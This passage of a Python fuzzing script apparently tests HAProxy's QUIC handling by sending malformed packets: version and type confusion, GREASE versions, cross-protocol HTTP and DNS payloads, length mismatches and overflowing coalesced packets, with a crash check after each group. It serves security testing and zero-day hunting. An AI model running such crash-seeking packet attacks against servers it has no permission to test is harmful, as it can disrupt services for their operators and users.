    print("\n" + "=" * 70)
    print("[*] Category 7: QUIC Version & Cross-Protocol Attacks")
    print("=" * 70)

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")
        dcid = os.urandom(QUIC_HAP_CID_LEN)
        scid = os.urandom(QUIC_HAP_CID_LEN)

        # 7.1: QUIC v2 (RFC 9369) - type encoding differs from v1
        # In v2: type 0=Retry, 1=Initial, 2=0-RTT, 3=Handshake
        # vs v1: type 0=Initial, 1=0-RTT, 2=Handshake, 3=Retry
        print(f"\n  [*] QUIC v2 type confusion ({port_label})")

        # Send v2 Initial (type bits = 01 in v2 = Initial)
        # Byte0 for v2 Initial: 1101_00pp (0xD0 | pp)
        v2_initial = struct.pack(">B", 0xD0)  # v2 Initial type
        v2_initial += struct.pack(">I", QUIC_VERSION_2)
        v2_initial += struct.pack(">B", len(dcid)) + dcid
        v2_initial += struct.pack(">B", len(scid)) + scid
        v2_initial += quic_encode_varint(0)  # token_len
        crypto_frame = b"\x06" + quic_encode_varint(0) + quic_encode_varint(0)
        v2_initial += quic_encode_varint(1 + len(crypto_frame))  # length
        v2_initial += b"\x00" + crypto_frame  # pkt_num + crypto
        v2_initial += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(v2_initial))
        resp = send_udp(v2_initial, host, port)
        resp_type, resp_detail = classify_response(resp, "v2_initial")
        evidence.add_test("Version-Attack", f"quic_v2_initial_{port}",
                         "SAFE",
                         f"QUIC v2 Initial: {resp_type} - {resp_detail}")

        # 7.2: Send v1 packet with v2 type mapping (type confusion attack)
        # If server doesn't check version before interpreting type bits,
        # a v1 Retry (type=3) could be confused with v2 Handshake (type=3)
        for v1_type, type_label in [(0, "Initial"), (1, "0-RTT"),
                                     (2, "Handshake"), (3, "Retry")]:
            byte0 = 0xC0 | (v1_type << 4)
            raw_pkt = struct.pack(">B", byte0)
            raw_pkt += struct.pack(">I", QUIC_VERSION_1)
            raw_pkt += struct.pack(">B", len(dcid)) + dcid
            raw_pkt += struct.pack(">B", len(scid)) + scid
            if v1_type == 0:  # Initial has token field
                raw_pkt += quic_encode_varint(0)
            raw_pkt += quic_encode_varint(2)  # length
            raw_pkt += b"\x00\x00"
            raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
            resp = send_udp(raw_pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"v1_type_{type_label}")
            evidence.add_test("Version-Attack", f"v1_pkt_type_{type_label}_{port}",
                             "SAFE",
                             f"v1 {type_label} (type={v1_type}): {resp_type} - {resp_detail}")

        # 7.3: GREASED versions (RFC 9001 Section 4.8.1)
        greased_versions = [
            0x0a0a0a0a, 0x1a1a1a1a, 0x2a2a2a2a, 0x3a3a3a3a,
            0x4a4a4a4a, 0x5a5a5a5a, 0xfafafafa
        ]
        for gv in greased_versions:
            pkt = build_quic_initial_packet(dcid, scid, b"",
                                             b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                             version=gv)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"grease_{gv:08X}")
            expected = resp_type == "VERSION_NEGOTIATION" or resp is None
            evidence.add_test("Version-Attack", f"greased_version_0x{gv:08X}_{port}",
                             "SAFE" if expected else "ANOMALY",
                             f"GREASE version 0x{gv:08X}: {resp_type} - {resp_detail}",
                             "MEDIUM" if not expected else None)

        # 7.4: Cross-protocol injection (HTTP/1.1 over UDP)
        http_req = b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
        resp = send_udp(http_req, host, port)
        resp_type, resp_detail = classify_response(resp, "http_over_udp")
        evidence.add_test("Version-Attack", f"http1_over_udp_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"HTTP/1.1 over UDP: {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 7.5: DNS query over QUIC port (protocol confusion)
        # Standard DNS query for example.com
        dns_query = b"\x00\x01"  # Transaction ID
        dns_query += b"\x01\x00"  # Flags: standard query
        dns_query += b"\x00\x01"  # Questions: 1
        dns_query += b"\x00\x00\x00\x00"  # Answer/Authority/Additional: 0
        dns_query += b"\x07example\x03com\x00"  # QNAME
        dns_query += b"\x00\x01"  # QTYPE: A
        dns_query += b"\x00\x01"  # QCLASS: IN
        resp = send_udp(dns_query, host, port)
        evidence.add_test("Version-Attack", f"dns_over_quic_port_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"DNS query on QUIC port: {classify_response(resp, 'dns')[1]}",
                         "MEDIUM" if resp is not None else None)

        # Crash check
        alive = check_haproxy_alive(host, port)
        evidence.add_test("Version-Attack", f"crash_check_post_version_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after version attacks: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Category 8: QUIC Header Manipulation Deep-Dive
# ============================================================

def test_header_manipulation():
    """Deep-dive header manipulation for zero-day hunting."""
    print("\n" + "=" * 70)
    print("[*] Category 8: QUIC Header Manipulation Deep-Dive")
    print("=" * 70)

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")
        scid = os.urandom(QUIC_HAP_CID_LEN)

        # 8.1: Length field vs actual data mismatches
        print(f"\n  [*] Length field mismatches ({port_label})")
        dcid = os.urandom(QUIC_HAP_CID_LEN)

        mismatch_tests = [
            # (label, claimed_length, actual_payload_bytes)
            ("length_0_payload_100", 0, 100),
            ("length_1_payload_0", 1, 0),
            ("length_100_payload_10", 100, 10),
            ("length_10_payload_100", 10, 100),
            ("length_16383_payload_5", 16383, 5),
            ("length_1_payload_1000", 1, 1000),
        ]
        for mm_label, claimed_len, actual_len in mismatch_tests:
            raw_pkt = struct.pack(">B", 0xC0)
            raw_pkt += struct.pack(">I", QUIC_VERSION_1)
            raw_pkt += struct.pack(">B", len(dcid)) + dcid
            raw_pkt += struct.pack(">B", len(scid)) + scid
            raw_pkt += quic_encode_varint(0)  # token_len = 0
            raw_pkt += quic_encode_varint(claimed_len)  # Length field
            raw_pkt += b"\x00" * actual_len  # actual payload
            raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
            resp = send_udp(raw_pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"mismatch_{mm_label}")
            evidence.add_test("Header-DeepDive", f"length_mismatch_{mm_label}_{port}",
                             "SAFE" if resp is None or "Initial" in resp_type or "Retry" in resp_type else "ANOMALY",
                             f"Length mismatch {mm_label}: {resp_type} - {resp_detail}")

        # 8.2: Reserved bits set in first byte
        print(f"\n  [*] Reserved bit manipulation ({port_label})")

        # The two least significant bits of byte0 are the packet number length,
        # bits 2-3 are reserved. For Initial, all bits are defined, but we can
        # set unexpected combinations.
        for byte0_val in [0xCC, 0xCF, 0xC4, 0xC8, 0xFC, 0xFF, 0xC1, 0xC2, 0xC3]:
            raw_pkt = struct.pack(">B", byte0_val)
            raw_pkt += struct.pack(">I", QUIC_VERSION_1)
            raw_pkt += struct.pack(">B", len(dcid)) + dcid
            raw_pkt += struct.pack(">B", len(scid)) + scid
            raw_pkt += quic_encode_varint(0)
            raw_pkt += quic_encode_varint(2)
            raw_pkt += b"\x00\x00"
            raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
            resp = send_udp(raw_pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"byte0_{byte0_val:02X}")
            evidence.add_test("Header-DeepDive", f"byte0_0x{byte0_val:02X}_{port}",
                             "SAFE",
                             f"Byte0=0x{byte0_val:02X}: {resp_type} - {resp_detail}")

        # 8.3: Short header packets (should be rejected for new connections)
        print(f"\n  [*] Short header on unknown connection ({port_label})")
        short_pkt = struct.pack(">B", 0x40)  # Short header, fixed bit set
        short_pkt += os.urandom(QUIC_HAP_CID_LEN)  # DCID
        short_pkt += b"\x00"  # packet number
        short_pkt += b"\x00" * 20  # fake payload
        resp = send_udp(short_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "short_header_unknown")
        evidence.add_test("Header-DeepDive", f"short_header_unknown_conn_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Short header (no connection): {resp_type} - {resp_detail}")

        # 8.4: Packet with version field that triggers different parsing paths
        print(f"\n  [*] Version field edge cases ({port_label})")
        edge_versions = [
            ("v1_minus_1", QUIC_VERSION_1 - 1),
            ("v1_plus_1", QUIC_VERSION_1 + 1),
            ("v2_minus_1", QUIC_VERSION_2 - 1),
            ("v2_plus_1", QUIC_VERSION_2 + 1),
            ("max_uint32", 0xFFFFFFFF),
            ("0x12345678", 0x12345678),
        ]
        for ev_label, ev_version in edge_versions:
            pkt = build_quic_initial_packet(dcid, scid, b"",
                                             b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                             version=ev_version)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"version_{ev_label}")
            evidence.add_test("Header-DeepDive", f"version_edge_{ev_label}_{port}",
                             "SAFE",
                             f"Version {ev_label} (0x{ev_version:08X}): {resp_type} - {resp_detail}")

        # 8.5: Multiple coalesced packets with escalating malformations
        print(f"\n  [*] Coalesced malformed packets ({port_label})")

        # Valid Initial + garbage after
        valid_initial = build_quic_initial_packet(dcid, scid, b"",
                                                   b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                                   pad_to_1200=False)
        # Second packet: truncated header
        garbage = b"\xC0\xFF\xFF\xFF\xFF" + os.urandom(50)
        coalesced = valid_initial + garbage
        if len(coalesced) < QUIC_INITIAL_PACKET_MINLEN:
            coalesced += b"\x00" * (QUIC_INITIAL_PACKET_MINLEN - len(coalesced))
        resp = send_udp(coalesced, host, port)
        resp_type, resp_detail = classify_response(resp, "valid_plus_garbage")
        evidence.add_test("Header-DeepDive", f"coalesced_valid_plus_garbage_{port}",
                         "SAFE",
                         f"Valid Initial + garbage: {resp_type} - {resp_detail}")

        # Valid Initial + packet with length claiming rest of datagram + more
        valid_initial2 = build_quic_initial_packet(dcid, scid, b"",
                                                    b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                                    pad_to_1200=False)
        # Second: same DCID, length overflows datagram
        overflow_pkt = struct.pack(">B", 0xC0)
        overflow_pkt += struct.pack(">I", QUIC_VERSION_1)
        overflow_pkt += struct.pack(">B", len(dcid)) + dcid
        overflow_pkt += struct.pack(">B", len(scid)) + scid
        overflow_pkt += quic_encode_varint(0)  # token
        overflow_pkt += quic_encode_varint(50000)  # length overflows
        overflow_pkt += b"\x00" * 20
        coalesced = valid_initial2 + overflow_pkt
        if len(coalesced) < QUIC_INITIAL_PACKET_MINLEN:
            coalesced += b"\x00" * (QUIC_INITIAL_PACKET_MINLEN - len(coalesced))
        resp = send_udp(coalesced, host, port)
        resp_type, resp_detail = classify_response(resp, "valid_plus_overflow_len")
        evidence.add_test("Header-DeepDive", f"coalesced_valid_overflow_length_{port}",
                         "SAFE",
                         f"Valid + overflow length: {resp_type} - {resp_detail}")

        # Crash check
        alive = check_haproxy_alive(host, port)
        evidence.add_test("Header-DeepDive", f"crash_check_post_header_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after header deep-dive: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Main
# ============================================================

if __name__ == "__main__":
    print("=" * 70)
    print("Phase 4: QUIC Protocol-Level Attacks")
    print(f"Target: HAProxy v3.3.0")
    print(f"  QUIC-only: {HOST}:{QUIC_PORT}")
    print(f"  QUIC+HTTPS: {HOST}:{QUIC_HTTPS_PORT}")
    print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

    categories = [
        ("Category 1: Initial Packet Fuzzing", test_initial_packet_fuzzing),
        ("Category 2: Varint Overflow/Underflow", test_quic_varint_overflow),
        ("Category 3: Frame Attacks", test_quic_frame_attacks),
        ("Category 4: Transport Parameter Fuzzing", test_transport_parameter_fuzzing),
        ("Category 5: CVE Regression Tests", test_cve_regressions),
        ("Category 6: Flood & Resource Exhaustion", test_quic_flood),
        ("Category 7: Version & Cross-Protocol", test_quic_version_attacks),
        ("Category 8: Header Manipulation Deep-Dive", test_header_manipulation),
    ]

    for cat_name, cat_func in categories:
        try:
            cat_func()
        except Exception as e:
            print(f"\n[!] Fatal error in {cat_name}: {e}")
            traceback.print_exc()
            evidence.add_test("FATAL", cat_name, "ERROR", str(e))

    # Final summary
    print("\n" + "=" * 70)
    print("[*] Phase 4 Complete: QUIC Protocol-Level Attacks")
    print("=" * 70)

    # Final crash check on both ports
    for host, port, port_label in TARGETS:
        alive = check_haproxy_alive(host, port)
        evidence.add_test("Summary", f"final_alive_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy {port_label} alive after all tests: {alive}",
                         "CRITICAL" if not alive else None)

    evidence.save()

    # Print findings summary
    if evidence.findings:
        print(f"\n{'=' * 70}")
        print(f"[!] {len(evidence.findings)} FINDINGS DETECTED:")
        for f in evidence.findings:
            sev = f.get('severity', 'UNKNOWN')
            print(f"  [{sev}] {f['category']}/{f['name']}")
            for line in str(f['details']).split('\n')[:3]:
                print(f"         {line}")
    else:
        print(f"\n[*] No findings detected. All {evidence.test_count} tests passed.")
